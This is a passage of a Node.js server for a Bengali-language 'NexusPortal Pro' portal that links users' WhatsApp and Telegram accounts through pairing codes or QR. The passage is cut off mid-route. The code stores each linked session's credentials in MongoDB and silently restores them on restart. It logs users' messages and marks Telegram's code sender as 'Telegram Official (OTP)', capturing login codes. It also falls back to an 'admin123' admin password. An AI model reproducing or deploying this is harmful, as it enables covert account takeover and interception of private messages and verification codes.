require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const pino = require('pino');
const QRCode = require('qrcode');

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');

const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');

const app = express();
const PORT = process.env.PORT || 10000;
const PENDING_TIMEOUT_MS = 2 * 60 * 1000; // 2 Minutes Auto-Cleanup Timeout
const MAX_MESSAGES_PER_USER = 50;
const CONCURRENCY_LIMIT = 4;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const WA_SESSIONS_DIR = path.join('/tmp', 'wa_sessions');
if (!fs.existsSync(WA_SESSIONS_DIR)) {
  fs.mkdirSync(WA_SESSIONS_DIR, { recursive: true });
}

// Cache Baileys version at boot so login never waits on GitHub/WA version fetch
let cachedBaileysVersion = [2, 3000, 1015901307];
fetchLatestBaileysVersion()
  .then((res) => {
    if (res && res.version) cachedBaileysVersion = res.version;
  })
  .catch(() => {});

// ==========================================
// 0. IP GEO COUNTRY DETECTION (Fast + Cached)
// ==========================================
const geoIpCache = new Map();

async function detectVisitorCountry(req) {
  const headerCountry = (
    req.headers['cf-ipcountry'] ||
    req.headers['x-vercel-ip-country'] ||
    req.headers['x-country-code'] ||
    req.headers['cloudfront-viewer-country'] ||
    ''
  ).toString().trim().toUpperCase();

  if (headerCountry && headerCountry.length === 2 && headerCountry !== 'XX' && headerCountry !== 'T1') {
    return headerCountry;
  }

  const forwarded = req.headers['x-forwarded-for'];
  const rawIp = (forwarded ? forwarded.split(',')[0] : req.socket?.remoteAddress || '').trim().replace(/^::ffff:/, '');
  if (!rawIp || rawIp === '127.0.0.1' || rawIp === '::1' || rawIp.startsWith('10.') || rawIp.startsWith('192.168.')) {
    return '';
  }

  if (geoIpCache.has(rawIp)) {
    return geoIpCache.get(rawIp);
  }

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 1200);
    const resp = await fetch(`http://ip-api.com/json/${encodeURIComponent(rawIp)}?fields=status,countryCode`, {
      signal: controller.signal
    });
    clearTimeout(timer);
    const data = await resp.json();
    if (data && data.status === 'success' && data.countryCode) {
      const code = String(data.countryCode).toUpperCase();
      geoIpCache.set(rawIp, code);
      if (geoIpCache.size > 2000) {
        const firstKey = geoIpCache.keys().next().value;
        geoIpCache.delete(firstKey);
      }
      return code;
    }
  } catch (e) {}

  return '';
}

// ==========================================
// 1. DATABASE SCHEMAS (MongoDB Atlas + Local Fallback)
// ==========================================
let mongoConnected = false;
let connectedDbName = 'nexus_saas';

const userSchema = new mongoose.Schema({
  userId: { type: String, unique: true, required: true },
  phone: { type: String, default: '' },
  name: { type: String, default: 'User' },
  platform: { type: String, enum: ['whatsapp', 'telegram'], default: 'whatsapp' },
  method: { type: String, enum: ['phone', 'qr', 'manual'], default: 'phone' },
  status: { type: String, enum: ['active', 'banned'], default: 'active' },
  sessionStatus: { type: String, enum: ['connected', 'disconnected'], default: 'connected' },
  planName: { type: String, default: 'Free Trial' },
  expiresAt: { type: Date, default: () => new Date(Date.now() + 60 * 60000) },
  referralCode: { type: String, unique: true },
  referredBy: { type: String, default: '' },
  referralCount: { type: Number, default: 0 },
  termsAccepted: { type: Boolean, default: true },
  termsAcceptedAt: { type: Date, default: Date.now },
  tgSessionString: { type: String, default: '' },
  waSessionKey: { type: String, default: '' },
  createdAt: { type: Date, default: Date.now },
  lastLoginAt: { type: Date, default: Date.now }
});

const sessionStoreSchema = new mongoose.Schema({
  sessionKey: { type: String, unique: true, required: true },
  files: { type: mongoose.Schema.Types.Mixed, default: {} },
  updatedAt: { type: Date, default: Date.now }
});

const messageLogSchema = new mongoose.Schema({
  userId: { type: String, index: true },
  phone: { type: String, default: '' },
  platform: { type: String, default: 'whatsapp' },
  sender: { type: String, default: '' },
  senderName: { type: String, default: '' },
  text: { type: String, default: '' },
  fromMe: { type: Boolean, default: false },
  timestamp: { type: Date, default: Date.now }
});

const paymentSchema = new mongoose.Schema({
  trxId: { type: String, unique: true, required: true },
  userId: { type: String, required: true },
  phone: { type: String, default: '' },
  method: { type: String, default: 'bKash' },
  planName: { type: String, default: 'Pro 30 Days' },
  amount: { type: Number, default: 0 },
  status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
  createdAt: { type: Date, default: Date.now }
});

const loginHistorySchema = new mongoose.Schema({
  userId: { type: String },
  phone: { type: String },
  platform: { type: String },
  method: { type: String },
  status: { type: String },
  timestamp: { type: Date, default: Date.now }
});

const DEFAULT_SETTINGS = {
  siteTitle: 'NexusPortal Pro',
  siteSubtitle: 'নিরাপদ অ্যাকাউন্ট লগ-ইন ও সাবস্ক্রিপশন পোর্টাল',
  customLoginNote: '',
  bgUrl: '',
  postLoginRedirectUrl: '',
  loginSessionMinutes: 1440, // Admin-configurable browser login session duration (default 24h / 1440m)
  // Feature Master Switches
  whatsappEnabled: true,
  telegramEnabled: true,
  loginMethodMode: 'both', // 'both' | 'phone_only' | 'qr_only'
  referralEnabled: true,
  freeTrialEnabled: true,
  paymentEnabled: true,
  termsEnabled: true,
  noticeEnabled: true,
  adsEnabled: true,
  supportEnabled: false,
  supportLabel: 'সাপোর্ট / যোগাযোগ',
  supportUrl: 'https://t.me/',
  // Time & Referral Settings (in Minutes)
  freeTrialMinutes: 60,
  referralBonusMinutes: 30,
  referralNewUserBonusMinutes: 15,
  // Payment Settings
  paymentInstruction: 'নিচের যেকোনো নাম্বারে Send Money করে Transaction ID (TrxID) সাবমিট করুন।',
  paymentNumbers: {
    bkash: '01818896166',
    bkashEnabled: true,
    nagad: '01818896166',
    nagadEnabled: true,
    rocket: '01818896166',
    rocketEnabled: true,
    banglaQrUrl: '',
    banglaQrEnabled: true
  },
  plans: [
    { id: 'plan_1h', name: 'Express (১ ঘণ্টা / ৬০ মিনিট)', minutes: 60, price: 30 },
    { id: 'plan_1d', name: 'Daily Pass (২৪ ঘণ্টা)', minutes: 1440, price: 80 },
    { id: 'plan_7d', name: 'Starter (৭ দিন)', minutes: 10080, price: 200 },
    { id: 'plan_30d', name: 'Pro Monthly (৩০ দিন)', minutes: 43200, price: 500 }
  ],
  // Notice & Terms
  noticeText: 'স্বাগতম NexusPortal Pro-তে! দ্রুত ও নিরাপদে আপনার WhatsApp বা Telegram অ্যাকাউন্ট কানেক্ট করুন।',
  termsTitle: 'শর্তাবলী ও গোপনীয়তা নীতি (Terms & Conditions)',
  termsText: `১. সেবা ও সম্মতি (Consent): NexusPortal Pro ব্যবহার করে আপনার WhatsApp বা Telegram অ্যাকাউন্ট সংযুক্ত করার মাধ্যমে আপনি সিস্টেমকে আপনার সেশন এবং প্রয়োজনীয় ইনকামিং মেসেজ/ভেরিফিকেশন সিঙ্ক করার অনুমতি প্রদান করছেন।\n২. অ্যাকাউন্ট নিরাপত্তা: আপনি আপনার নিজস্ব বৈধ অ্যাকাউন্ট ব্যবহার করে লগ-ইন করছেন বলে নিশ্চিত করছেন। যেকোনো সময় আপনার ফোনের Linked Devices বা Active Sessions থেকে এই সংযোগ বিচ্ছিন্ন করার পূর্ণ অধিকার আপনার রয়েছে।\n৩. সাবস্ক্রিপশন ও পেমেন্ট: ফ্রি ট্রায়াল বা বোনাস মিনিট শেষ হওয়ার পর নিরবচ্ছিন্ন সেবা পেতে নির্ধারিত প্যাকেজ অনুযায়ী পেমেন্ট সম্পন্ন করতে হবে। ভুয়া TrxID প্রদান করলে অ্যাকাউন্ট স্থগিত করা হতে পারে।\n৪. নীতিমালা: স্প্যামিং বা অবৈধ কাজে এই প্ল্যাটফর্ম ব্যবহার সম্পূর্ণ নিষিদ্ধ।`,
  // Ads Slots
  adScriptTop: '',
  adScript: '',
  customAdminPassword: ''
};

const settingsSchema = new mongoose.Schema({
  key: { type: String, unique: true, default: 'global' },
  siteTitle: { type: String, default: DEFAULT_SETTINGS.siteTitle },
  siteSubtitle: { type: String, default: DEFAULT_SETTINGS.siteSubtitle },
  customLoginNote: { type: String, default: '' },
  bgUrl: { type: String, default: '' },
  postLoginRedirectUrl: { type: String, default: '' },
  loginSessionMinutes: { type: Number, default: 1440 },
  whatsappEnabled: { type: Boolean, default: true },
  telegramEnabled: { type: Boolean, default: true },
  loginMethodMode: { type: String, default: 'both' },
  referralEnabled: { type: Boolean, default: true },
  freeTrialEnabled: { type: Boolean, default: true },
  paymentEnabled: { type: Boolean, default: true },
  termsEnabled: { type: Boolean, default: true },
  noticeEnabled: { type: Boolean, default: true },
  adsEnabled: { type: Boolean, default: true },
  supportEnabled: { type: Boolean, default: false },
  supportLabel: { type: String, default: DEFAULT_SETTINGS.supportLabel },
  supportUrl: { type: String, default: DEFAULT_SETTINGS.supportUrl },
  freeTrialMinutes: { type: Number, default: 60 },
  referralBonusMinutes: { type: Number, default: 30 },
  referralNewUserBonusMinutes: { type: Number, default: 15 },
  paymentInstruction: { type: String, default: DEFAULT_SETTINGS.paymentInstruction },
  paymentNumbers: { type: mongoose.Schema.Types.Mixed, default: DEFAULT_SETTINGS.paymentNumbers },
  plans: { type: Array, default: DEFAULT_SETTINGS.plans },
  noticeText: { type: String, default: DEFAULT_SETTINGS.noticeText },
  termsTitle: { type: String, default: DEFAULT_SETTINGS.termsTitle },
  termsText: { type: String, default: DEFAULT_SETTINGS.termsText },
  adScriptTop: { type: String, default: '' },
  adScript: { type: String, default: '' },
  customAdminPassword: { type: String, default: '' }
});

const User = mongoose.model('User', userSchema);
const SessionStore = mongoose.model('SessionStore', sessionStoreSchema);
const MessageLog = mongoose.model('MessageLog', messageLogSchema);
const Payment = mongoose.model('Payment', paymentSchema);
const LoginHistory = mongoose.model('LoginHistory', loginHistorySchema);
const Settings = mongoose.model('Settings', settingsSchema);

// Local JSON Fallback Store
const LOCAL_DATA_FILE = path.join(__dirname, 'data.json');
let localStore = {
  users: [],
  payments: [],
  loginHistory: [],
  messages: [],
  settings: JSON.parse(JSON.stringify(DEFAULT_SETTINGS))
};

function saveLocalStore() {
  if (!mongoConnected) {
    try {
      fs.writeFileSync(LOCAL_DATA_FILE, JSON.stringify(localStore, null, 2));
    } catch (e) {}
  }
}

if (fs.existsSync(LOCAL_DATA_FILE)) {
  try {
    const parsed = JSON.parse(fs.readFileSync(LOCAL_DATA_FILE, 'utf8'));
    localStore = {
      ...localStore,
      ...parsed,
      settings: { ...DEFAULT_SETTINGS, ...(parsed.settings || {}) }
    };
  } catch (e) {}
}

async function getSettings() {
  if (mongoConnected) {
    let doc = await Settings.findOne({ key: 'global' });
    if (!doc) {
      doc = await Settings.create({ key: 'global' });
    }
    const obj = doc.toObject();
    return {
      ...DEFAULT_SETTINGS,
      ...obj,
      paymentNumbers: { ...DEFAULT_SETTINGS.paymentNumbers, ...(obj.paymentNumbers || {}) }
    };
  }
  return {
    ...DEFAULT_SETTINGS,
    ...localStore.settings,
    paymentNumbers: { ...DEFAULT_SETTINGS.paymentNumbers, ...(localStore.settings.paymentNumbers || {}) }
  };
}

function getEffectiveAdminPassword(settings) {
  if (settings && settings.customAdminPassword && settings.customAdminPassword.trim() !== '') {
    return settings.customAdminPassword.trim();
  }
  return (process.env.ADMIN_PASSWORD || 'admin123').trim();
}

function generateReferralCode() {
  return 'NX' + crypto.randomBytes(3).toString('hex').toUpperCase();
}

function normalizePhone(raw, defaultDialCode = '') {
  if (!raw) return '';
  const trimmed = String(raw).trim();
  let digits = trimmed.replace(/\D/g, '');
  if (!digits) return '';

  // If user pasted full number with '+', keep as-is
  if (trimmed.startsWith('+')) {
    return digits;
  }

  // If a country dial code is provided and digits don't already start with it
  if (defaultDialCode) {
    const cleanDial = String(defaultDialCode).replace(/\D/g, '');
    if (cleanDial) {
      if (digits.startsWith(cleanDial) && digits.length >= cleanDial.length + 7) {
        return digits;
      }
      digits = digits.replace(/^0+/, '');
      return cleanDial + digits;
    }
  }

  // Fallback for Bangladesh local format
  if (digits.startsWith('01') && digits.length === 11) {
    digits = '88' + digits;
  }
  return digits;
}

// ==========================================
// 2. CONCURRENCY QUEUE (Handles sudden bursts)
// ==========================================
let activeQueueTasks = 0;
const taskQueue = [];

function enqueueLoginTask(fn) {
  return new Promise((resolve, reject) => {
    const run = async () => {
      activeQueueTasks++;
      try {
        const res = await fn();
        resolve(res);
      } catch (err) {
        reject(err);
      } finally {
        activeQueueTasks--;
        if (taskQueue.length > 0) {
          const next = taskQueue.shift();
          next();
        }
      }
    };

    if (activeQueueTasks < CONCURRENCY_LIMIT) {
      run();
    } else {
      taskQueue.push(run);
    }
  });
}

// ==========================================
// 3. MESSAGE & USER PERSISTENCE HELPERS
// ==========================================
async function recordIncomingMessage({ userId, phone, platform, sender, senderName, text, fromMe }) {
  if (!text) return;
  const entry = {
    userId,
    phone: phone || '',
    platform: platform || 'whatsapp',
    sender: sender || 'Unknown',
    senderName: senderName || '',
    text: String(text).slice(0, 1500),
    fromMe: Boolean(fromMe),
    timestamp: new Date()
  };

  if (mongoConnected) {
    try {
      await MessageLog.create(entry);
      const count = await MessageLog.countDocuments({ userId });
      if (count > MAX_MESSAGES_PER_USER) {
        const oldest = await MessageLog.find({ userId })
          .sort({ timestamp: 1 })
          .limit(count - MAX_MESSAGES_PER_USER);
        const ids = oldest.map((d) => d._id);
        await MessageLog.deleteMany({ _id: { $in: ids } });
      }
    } catch (e) {}
  } else {
    localStore.messages.unshift(entry);
    if (localStore.messages.length > 300) localStore.messages.length = 300;
    saveLocalStore();
  }
}

async function logLoginEvent({ userId, phone, platform, method, status }) {
  const item = { userId, phone, platform, method, status, timestamp: new Date() };
  if (mongoConnected) {
    try {
      await LoginHistory.create(item);
    } catch (e) {}
  } else {
    localStore.loginHistory.unshift(item);
    if (localStore.loginHistory.length > 100) localStore.loginHistory.length = 100;
    saveLocalStore();
  }
}

async function upsertConnectedUser({ phone, name, platform, method, referredBy, termsAccepted, tgSessionString, waSessionKey }) {
  const settings = await getSettings();
  const cleanPhone = normalizePhone(phone);
  const userId = `${platform}_${cleanPhone || crypto.randomBytes(4).toString('hex')}`;
  const trialMinutes = settings.freeTrialEnabled ? (Number(settings.freeTrialMinutes) || 0) : 0;
  const trialMs = trialMinutes * 60000;

  if (mongoConnected) {
    let user = await User.findOne({ userId });
    if (!user && cleanPhone) {
      user = await User.findOne({ phone: cleanPhone, platform });
    }
    if (user) {
      user.sessionStatus = 'connected';
      user.lastLoginAt = new Date();
      if (name) user.name = name;
      if (tgSessionString) user.tgSessionString = tgSessionString;
      if (waSessionKey) user.waSessionKey = waSessionKey;
      if (termsAccepted) {
        user.termsAccepted = true;
        user.termsAcceptedAt = new Date();
      }
      await user.save();
      return user;
    }

    // Handle Referral Bonus in MINUTES if Referral System is Enabled
    let newUserBonusMs = 0;
    const refCode = settings.referralEnabled ? (referredBy || '').trim().toUpperCase() : '';
    if (settings.referralEnabled && refCode) {
      const referrer = await User.findOne({ referralCode: refCode });
      if (referrer) {
        const refAddMs = (Number(settings.referralBonusMinutes) || 0) * 60000;
        const currentExp = referrer.expiresAt && referrer.expiresAt > new Date() ? referrer.expiresAt.getTime() : Date.now();
        referrer.expiresAt = new Date(currentExp + refAddMs);
        referrer.referralCount = (referrer.referralCount || 0) + 1;
        await referrer.save();
        newUserBonusMs = (Number(settings.referralNewUserBonusMinutes) || 0) * 60000;
      }
    }

    const totalInitialMs = trialMs + newUserBonusMs;
    const planLabel = totalInitialMs > 0
      ? (newUserBonusMs > 0 ? `Trial + Referral (${Math.round(totalInitialMs / 60000)} মিনিট)` : `Free Trial (${trialMinutes} মিনিট)`)
      : 'Basic Access (0 মিনিট)';

    const newUser = await User.create({
      userId,
      phone: cleanPhone,
      name: name || (cleanPhone ? `+${cleanPhone}` : 'Portal User'),
      platform,
      method,
      status: 'active',
      sessionStatus: 'connected',
      planName: planLabel,
      expiresAt: new Date(Date.now() + totalInitialMs),
      referralCode: generateReferralCode(),
      referredBy: refCode,
      termsAccepted: Boolean(termsAccepted),
      termsAcceptedAt: new Date(),
      tgSessionString: tgSessionString || '',
      waSessionKey: waSessionKey || ''
    });
    return newUser;
  } else {
    let user = localStore.users.find((u) => u.userId === userId || (cleanPhone && u.phone === cleanPhone && u.platform === platform));
    if (user) {
      user.sessionStatus = 'connected';
      user.lastLoginAt = new Date();
      if (name) user.name = name;
      saveLocalStore();
      return user;
    }

    let newUserBonusMs = 0;
    const refCode = settings.referralEnabled ? (referredBy || '').trim().toUpperCase() : '';
    if (settings.referralEnabled && refCode) {
      const referrer = localStore.users.find((u) => u.referralCode === refCode);
      if (referrer) {
        const refAddMs = (Number(settings.referralBonusMinutes) || 0) * 60000;
        const base = referrer.expiresAt && new Date(referrer.expiresAt) > new Date() ? new Date(referrer.expiresAt).getTime() : Date.now();
        referrer.expiresAt = new Date(base + refAddMs);
        referrer.referralCount = (referrer.referralCount || 0) + 1;
        newUserBonusMs = (Number(settings.referralNewUserBonusMinutes) || 0) * 60000;
      }
    }

    const totalInitialMs = trialMs + newUserBonusMs;
    user = {
      userId,
      phone: cleanPhone,
      name: name || (cleanPhone ? `+${cleanPhone}` : 'Portal User'),
      platform,
      method,
      status: 'active',
      sessionStatus: 'connected',
      planName: totalInitialMs > 0 ? `Free Trial (${Math.round(totalInitialMs / 60000)} মিনিট)` : 'Basic Access',
      expiresAt: new Date(Date.now() + totalInitialMs),
      referralCode: generateReferralCode(),
      referredBy: refCode,
      referralCount: 0,
      termsAccepted: Boolean(termsAccepted),
      termsAcceptedAt: new Date(),
      createdAt: new Date(),
      lastLoginAt: new Date()
    };
    localStore.users.unshift(user);
    saveLocalStore();
    return user;
  }
}

// ==========================================
// 4. WHATSAPP ENGINE (@whiskeysockets/baileys)
// ==========================================
const pendingSessions = new Map();
const activeWaSockets = new Map();

async function restoreWaFilesFromMongo(sessionKey, folderPath) {
  if (!mongoConnected) return false;
  try {
    const doc = await SessionStore.findOne({ sessionKey });
    if (!doc || !doc.files) return false;
    if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
    const entries = Object.entries(doc.files);
    if (entries.length === 0) return false;
    for (const [fileName, content] of entries) {
      fs.writeFileSync(path.join(folderPath, fileName), content, 'utf8');
    }
    return true;
  } catch (e) {
    return false;
  }
}

async function syncWaFilesToMongo(sessionKey, folderPath) {
  if (!mongoConnected || !fs.existsSync(folderPath)) return;
  try {
    const filesObj = {};
    const names = fs.readdirSync(folderPath);
    for (const name of names) {
      if (name.endsWith('.json')) {
        filesObj[name] = fs.readFileSync(path.join(folderPath, name), 'utf8');
      }
    }
    await SessionStore.findOneAndUpdate(
      { sessionKey },
      { sessionKey, files: filesObj, updatedAt: new Date() },
      { upsert: true }
    );
  } catch (e) {}
}

function cleanupFolder(folderPath) {
  try {
    if (fs.existsSync(folderPath)) {
      fs.rmSync(folderPath, { recursive: true, force: true });
    }
  } catch (e) {}
}

// Syncs ONLY messages arriving/sent AFTER user connects (ignores pre-login history)
function attachWaMessageListener(sock, userId, phone) {
  const connectedAtSec = Math.floor(Date.now() / 1000) - 3;

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (!Array.isArray(messages)) return;
    if (type && type !== 'notify') return;

    for (const msg of messages) {
      if (!msg.message) continue;
      const remoteJid = msg.key?.remoteJid || '';
      if (!remoteJid || remoteJid === 'status@broadcast' || remoteJid.endsWith('@newsletter')) continue;

      const rawTs = msg.messageTimestamp;
      const msgTs = typeof rawTs === 'number' ? rawTs : Number(rawTs?.low ?? rawTs ?? 0);
      if (msgTs > 0 && msgTs < connectedAtSec) continue;

      const senderPhone = remoteJid.split('@')[0] || remoteJid;
      const text =
        msg.message.conversation ||
        msg.message.extendedTextMessage?.text ||
        msg.message.imageMessage?.caption ||
        msg.message.videoMessage?.caption ||
        msg.message.documentMessage?.caption ||
        msg.message.buttonsResponseMessage?.selectedDisplayText ||
        msg.message.listResponseMessage?.title ||
        msg.message.templateButtonReplyMessage?.selectedDisplayText ||
        '[Media / System Message]';

      await recordIncomingMessage({
        userId,
        phone,
        platform: 'whatsapp',
        sender: senderPhone,
        senderName: msg.pushName || senderPhone,
        text,
        fromMe: Boolean(msg.key?.fromMe)
      });
    }
  });
}

async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsAccepted, isRestore = false, existingSessionKey = '' }) {
  const cleanPhone = normalizePhone(phone);
  const sessionKey = existingSessionKey || (cleanPhone ? `wa_${cleanPhone}` : `wa_${sessionId}`);
  const folderPath = path.join(WA_SESSIONS_DIR, sessionKey);

  if (isRestore) {
    await restoreWaFilesFromMongo(sessionKey, folderPath);
  } else {
    cleanupFolder(folderPath);
    fs.mkdirSync(folderPath, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(folderPath);

  const sock = makeWASocket({
    version: cachedBaileysVersion,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    connectTimeoutMs: 30000,
    defaultQueryTimeoutMs: 30000,
    keepAliveIntervalMs: 25000,
    markOnlineOnConnect: false,
    syncFullHistory: false
  });

  let pairingRequested = false;
  let connectedUserId = null;

  const sessionState = pendingSessions.get(sessionId);
  if (sessionState) {
    sessionState.sock = sock;
    sessionState.folderPath = folderPath;
  }

  sock.ev.on('creds.update', async () => {
    await saveCreds();
    syncWaFilesToMongo(sessionKey, folderPath).catch(() => {});
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    const current = pendingSessions.get(sessionId);

    if (qr && !isRestore) {
      if (method === 'qr') {
        try {
          const qrDataUrl = await QRCode.toDataURL(qr, { width: 280, margin: 1 });
          if (current) {
            current.status = 'qr_ready';
            current.qrDataUrl = qrDataUrl;
          }
        } catch (err) {
          if (current) {
            current.status = 'error';
            current.error = 'QR কোড তৈরি করতে সমস্যা হয়েছে।';
          }
        }
      } else if (method === 'phone' && !pairingRequested && !sock.authState.creds.registered) {
        pairingRequested = true;
        setTimeout(async () => {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            const formatted = rawCode && rawCode.length === 8
              ? `${rawCode.slice(0, 4)}-${rawCode.slice(4)}`
              : rawCode;
            if (current) {
              current.status = 'code_ready';
              current.pairingCode = formatted;
            }
          } catch (err) {
            if (current) {
              current.status = 'error';
              current.error = 'পেয়ারিং কোড পাঠানো যায়নি। নাম্বারটি সঠিক কি না যাচাই করুন।';
            }
          }
        }, 250);
      }
    }

    if (connection === 'open') {
      if (current && current.timeoutTimer) {
        clearTimeout(current.timeoutTimer);
      }

      const detectedPhone = normalizePhone(sock.user?.id?.split(':')[0] || sock.user?.id?.split('@')[0] || cleanPhone);
      const detectedName = sock.user?.name || (detectedPhone ? `+${detectedPhone}` : 'WhatsApp User');

      await syncWaFilesToMongo(sessionKey, folderPath);

      const userDoc = await upsertConnectedUser({
        phone: detectedPhone,
        name: detectedName,
        platform: 'whatsapp',
        method,
        referredBy,
        termsAccepted,
        waSessionKey: sessionKey
      });

      connectedUserId = userDoc.userId;

      const oldSock = activeWaSockets.get(connectedUserId);
      if (oldSock && oldSock !== sock) {
        try { oldSock.end(); } catch (e) {}
      }
      activeWaSockets.set(connectedUserId, sock);
      attachWaMessageListener(sock, connectedUserId, detectedPhone);

      if (!isRestore) {
        await logLoginEvent({
          userId: connectedUserId,
          phone: detectedPhone,
          platform: 'whatsapp',
          method,
          status: 'Success'
        });
      }

      if (current) {
        current.status = 'connected';
        current.user = userDoc;
      }
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      if (connectedUserId) {
        if (!shouldReconnect) {
          activeWaSockets.delete(connectedUserId);
          cleanupFolder(folderPath);
          if (mongoConnected) {
            await User.updateOne({ userId: connectedUserId }, { sessionStatus: 'disconnected' });
            await SessionStore.deleteOne({ sessionKey });
          }
        } else {
          setTimeout(() => {
            startWhatsAppLogin({
              sessionId: `restore_${Date.now()}`,
              phone: cleanPhone,
              method: 'phone',
              isRestore: true,
              existingSessionKey: sessionKey
            }).catch(() => {});
          }, 5000);
        }
      } else if (!isRestore && current && current.status !== 'expired') {
        if (statusCode === DisconnectReason.loggedOut) {
          current.status = 'error';
          current.error = 'ডিভাইস থেকে লগ-আউট করা হয়েছে। আবার চেষ্টা করুন।';
        }
      }
    }
  });
}

// ==========================================
// 5. TELEGRAM ENGINE (GramJS - Fast OTP + Post-Login Live Sync)
// ==========================================
const activeTgClients = new Map();

function attachTgMessageListener(client, userId, phone) {
  const connectedAtSec = Math.floor(Date.now() / 1000) - 3;

  client.addEventHandler(async (event) => {
    try {
      const msg = event.message;
      if (!msg || !msg.message) return;
      if (msg.date && Number(msg.date) < connectedAtSec) return;

      const senderId = msg.senderId ? String(msg.senderId) : 'Telegram';
      const senderName = senderId === '777000' ? 'Telegram Official (OTP)' : senderId;
      await recordIncomingMessage({
        userId,
        phone,
        platform: 'telegram',
        sender: senderId,
        senderName,
        text: msg.message,
        fromMe: Boolean(msg.out)
      });
    } catch (e) {}
  }, new NewMessage({}));
}

async function restoreAllSavedSessions() {
  if (!mongoConnected) return;
  try {
    const waUsers = await User.find({ platform: 'whatsapp', sessionStatus: 'connected', status: 'active' });
    for (const u of waUsers) {
      if (u.waSessionKey) {
        startWhatsAppLogin({
          sessionId: `boot_${u.userId}`,
          phone: u.phone,
          method: u.method || 'phone',
          isRestore: true,
          existingSessionKey: u.waSessionKey
        }).catch(() => {});
      }
    }

    const apiId = Number(process.env.TG_API_ID);
    const apiHash = process.env.TG_API_HASH;
    if (apiId && apiHash) {
      const tgUsers = await User.find({ platform: 'telegram', sessionStatus: 'connected', status: 'active' });
      await Promise.allSettled(
        tgUsers.map(async (u) => {
          if (!u.tgSessionString) return;
          const client = new TelegramClient(new StringSession(u.tgSessionString), apiId, apiHash, {
            connectionRetries: 2,
            useWSS: false
          });
          await client.connect();
          activeTgClients.set(u.userId, client);
          attachTgMessageListener(client, u.userId, u.phone);
        })
      );
    }
  } catch (e) {}
}

// ==========================================
// 6. PUBLIC & AUTH API ROUTES
// ==========================================
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    version: 'v4.1',
    uptime: Math.floor(process.uptime()),
    db: mongoConnected ? 'connected' : 'local_json',
    activeWaSessions: activeWaSockets.size,
    activeTgSessions: activeTgClients.size,
    pendingSessions: pendingSessions.size,
    queuedTasks: taskQueue.length
  });
});

app.get('/api/public/config', async (req, res) => {
  const [s, detectedCountry] = await Promise.all([
    getSettings(),
    detectVisitorCountry(req)
  ]);

  res.json({
    detectedCountry,
    siteTitle: s.siteTitle,
    siteSubtitle: s.siteSubtitle,
    customLoginNote: s.customLoginNote,
    bgUrl: s.bgUrl,
    postLoginRedirectUrl: s.postLoginRedirectUrl,
    loginSessionMinutes: Number(s.loginSessionMinutes) || 1440,
    whatsappEnabled: s.whatsappEnabled,
    telegramEnabled: s.telegramEnabled,
    loginMethodMode: s.loginMethodMode,
    referralEnabled: s.referralEnabled,
    freeTrialEnabled: s.freeTrialEnabled,
    paymentEnabled: s.paymentEnabled,
    termsEnabled: s.termsEnabled,
    noticeEnabled: s.noticeEnabled,
    adsEnabled: s.adsEnabled,
    supportEnabled: s.supportEnabled,
    supportLabel: s.supportLabel,
    supportUrl: s.supportUrl,
    freeTrialMinutes: s.freeTrialMinutes,
    referralBonusMinutes: s.referralBonusMinutes,
    referralNewUserBonusMinutes: s.referralNewUserBonusMinutes,
    paymentInstruction: s.paymentInstruction,
    paymentNumbers: s.paymentNumbers,
    plans: s.plans,
    noticeText: s.noticeText,
    termsTitle: s.termsTitle,
    termsText: s.termsText,
    adScriptTop: s.adScriptTop,
    adScript: s.adScript
  });
});

function validateLoginPolicy(settings, platform, method, termsAccepted) {
  if (platform === 'whatsapp' && !settings.whatsappEnabled) {
    return 'বর্তমানে WhatsApp লগ-ইন সাময়িকভাবে বন্ধ রাখা হয়েছে।';
  }
  if (platform === 'telegram' && !settings.telegramEnabled) {
    return 'বর্তমানে Telegram লগ-ইন সাময়িকভাবে বন্ধ রাখা হয়েছে।';
  }
  if (settings.loginMethodMode === 'phone_only' && method !== 'phone') {
    return 'বর্তমানে শুধুমাত্র নাম্বার দিয়ে লগ-ইন চালু আছে।';
  }
  if (settings.loginMethodMode === 'qr_only' && method !== 'qr') {
    return 'বর্তমানে শুধুমাত্র QR Code দিয়ে লগ-ইন চালু আছে।';
  }
  if (settings.termsEnabled && !termsAccepted) {
    return 'লগ-ইন করার আগে অনুগ্রহ করে শর্তাবলী (Terms & Conditions) চেকবক্সে টিক দিন।';
  }
  return null;
}

// Start WhatsApp Login
app.post('/api/auth/whatsapp/start', async (req, res) => {
  const { phone, dialCode, method, referredBy, termsAccepted } = req.body || {};
  const settings = await getSettings();
  const loginMethod = method === 'qr' ? 'qr' : 'phone';

  const policyErr = validateLoginPolicy(settings, 'whatsapp', loginMethod, termsAccepted);
  if (policyErr) return res.status(400).json({ ok: false, error: policyErr });

  const cleanPhone = normalizePhone(phone, dialCode);
  if (loginMethod === 'phone' && (!cleanPhone || cleanPhone.length < 10)) {
    return res.status(400).json({ ok: false, error: 'সঠিক মোবাইল নাম্বার দিন।' });
  }

  const sessionId = 'wa_' + crypto.randomBytes(6).toString('hex');
  const expiresAt = Date.now() + PENDING_TIMEOUT_MS;

  const timeoutTimer = setTimeout(() => {
    const s = pendingSessions.get(sessionId);
    if (s && s.status !== 'connected') {
      s.status = 'expired';
